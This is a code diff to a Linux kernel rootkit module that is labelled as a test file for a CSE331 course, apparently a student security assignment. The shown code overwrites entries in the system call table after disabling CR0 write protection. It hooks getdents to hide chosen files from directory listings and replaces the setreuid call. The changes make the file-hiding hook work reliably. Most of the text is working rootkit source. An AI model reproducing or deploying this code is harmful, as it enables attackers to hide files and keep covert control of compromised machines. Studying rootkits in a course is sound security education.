@@ -9,14 +9,13 @@
 #include <asm/uaccess.h>
 #include <asm/unistd.h>
 #include <linux/dirent.h>
-//#include "lsFuncs.h"
 
 MODULE_LICENSE("GPL") ;
 MODULE_AUTHOR("Brendan<brendanfoley1214@gmail.com>") ;
 MODULE_DESCRIPTION("Rootkit Testfile for CSE331") ;
 MODULE_VERSION("0.3");
 
-static unsigned long *sys_call_address; // Pointer to the sys_call_table
+void **sys_call_address; // Pointer to the sys_call_table
 
 asmlinkage int (* old_setreuid) (uid_t ruid, uid_t euid);
 asmlinkage int our_setreuid(uid_t ruid, uid_t euid){
@@ -59,14 +58,23 @@ struct linux_dirent {
 
 int count;
 static char* fileNames[5];
-module_param_array(fileNames, charp, &count, 0); // This creates a command line parameter called fileNames.
-												 // fileNames="a.txt", "b.txt", "c.txt" ... up to 5 files
+module_param_array(fileNames, charp, &count, 0); // This creates a command line parameter called fileNames. fileNames="a.txt", "b.txt", "c.txt" ... up to 5 files
 		   
-asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent* dirp, unsigned int count);
 
-asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
+asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, unsigned int count){
 	int rtn = original_getdents(fd, dirp, count); // rtn = the number of bytes of linux_dirent structs read from fd;
-	struct linux_dirent *cur = dirp;
+	struct linux_dirent* my_dirp = kmalloc(rtn, GFP_KERNEL); // Need to create a buffer to copy over dirp contents
+	if(!my_dirp){
+		printk(KERN_INFO "Failed to allocate memory\n");
+		return rtn;
+	}
+	if(copy_from_user(my_dirp, dirp, rtn) != 0){ // Need to copy since we're unable to directly dereference dirp pointer
+		printk(KERN_INFO "Failed to copy all bytes from copy_from_user\n");
+		kfree(my_dirp);
+		return rtn;
+	}
+	struct linux_dirent* cur = my_dirp;
 	int i = 0;
 	int j;
 	int foundFile;
@@ -76,18 +84,20 @@ asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent *dirp, uns
 			if (strncmp(cur->d_name, fileNames[j], strlen(fileNames[j])) == 0){
 				int reclen = cur->d_reclen;
 				char* next_rec = (char*)cur + reclen;
-				int len = (int)dirp + rtn - (int)next_rec;
-				memmove(cur, next_rec, len);
-				rtn -= reclen;
+				int len = (int)my_dirp + rtn - (int)next_rec;
+				memmove(cur, next_rec, len); // Overwrite dirent by shifting contents to the left
+				rtn -= reclen; // New dirp array will now be shorter since a dir ent got overwritten
 				foundFile = 1;
 				continue;
 			}
 		}
 		if(foundFile == 0){ // This flag prevents the program from skipping ahead when memory already got shifted
 			i += cur->d_reclen;
-			cur = (struct linux_dirent*) ((char*)dirp + i);
+			cur = (struct linux_dirent*) ((char*)my_dirp + i); // Go to next dir entry 
 		}
+		copy_to_user(dirp, my_dirp, rtn); // Safely copy over modified results to dirp
 	}
+	kfree(my_dirp);
 	return rtn;
 }
 
@@ -102,7 +112,6 @@ static int __init rootkit_init(void){
     	return -1;
   	}	
 	printk(KERN_INFO "sys_call_table Address is: %X\n", *sys_call_address);
-	
 	write_cr0(read_cr0() & (~0x10000)); // This will make the sys call table writable
 
 	// Start Brian
